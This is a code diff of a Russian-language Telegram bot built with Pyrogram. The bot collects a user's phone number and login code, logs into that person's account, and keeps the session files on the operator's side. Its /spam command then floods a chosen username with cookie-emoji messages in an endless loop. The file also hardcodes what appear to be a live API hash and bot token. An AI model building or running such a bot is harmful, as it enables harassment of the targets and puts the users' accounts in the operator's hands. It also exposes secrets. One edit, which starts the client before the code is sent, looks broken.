@@ -1,14 +1,11 @@
 import asyncio
-import os
 from pyrogram import Client, filters
-from pyrogram.types import Message
 
 API_ID = 34887681
 API_HASH = "9a2905a9627fb1959b6699452ec59e99"
 BOT_TOKEN = "8990879407:AAHi7CTsOEhLSAr38RnL6dK5teG9Bj28IuQ"
 
 app = Client("bot_session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
-
 temp_clients = {}
 
 @app.on_message(filters.private & filters.command("start"))
@@ -16,6 +13,7 @@ async def start(c, m):
     chat_id = m.chat.id
     await m.reply("📱 Отправь номер с кодом страны (например +79991234567)")
     client = Client(f"sessions/{chat_id}", api_id=API_ID, api_hash=API_HASH)
+    await client.start()  # <--- ВАЖНО: запускаем клиент
     temp_clients[chat_id] = {"client": client, "step": "wait_code"}
 
 @app.on_message(filters.private & filters.regex(r"^\+\d{7,15}$"))
@@ -32,7 +30,7 @@ async def handle_number(c, m):
         data["number"] = number
         data["phone_code_hash"] = sent.phone_code_hash
         data["step"] = "wait_code"
-        await m.reply(f"✅ Код отправлен на {number}. Введи код (только цифры)")
+        await m.reply(f"✅ Код отправлен на {number}. Введи код")
     except Exception as e:
         await m.reply(f"❌ Ошибка: {e}")
 
@@ -51,30 +49,30 @@ async def handle_code(c, m):
             phone_code_hash=data["phone_code_hash"],
             phone_code=code
         )
-        await m.reply("✅ Вход выполнен! Теперь отправь /spam @username")
+        await m.reply("✅ Вход выполнен! Теперь /spam @username")
         data["step"] = "logged"
     except Exception as e:
-        await m.reply(f"❌ Неверный код: {e}")
+        await m.reply(f"❌ Ошибка: {e}")
 
 @app.on_message(filters.private & filters.command("spam"))
 async def spam(c, m):
     chat_id = m.chat.id
     if chat_id not in temp_clients:
-        await m.reply("❌ Сначала /start и войди")
+        await m.reply("❌ Сначала /start")
         return
     data = temp_clients[chat_id]
     if data.get("step") != "logged":
-        await m.reply("❌ Ты ещё не вошёл. Отправь номер и код.")
+        await m.reply("❌ Войди сначала")
         return
     parts = m.text.split()
     if len(parts) < 2:
-        await m.reply("⚠️ Пример: /spam @username")
+        await m.reply("⚠️ /spam @username")
         return
     target = parts[1].strip()
     client = data["client"]
     try:
         target_user = await client.get_users(target)
-        await m.reply(f"🔁 Спам {target_user.first_name} печеньем 🍪")
+        await m.reply(f"🔁 Спам {target_user.first_name} 🍪")
         count = 0
         while True:
             await client.send_message(target_user.id, "🍪" * 20)
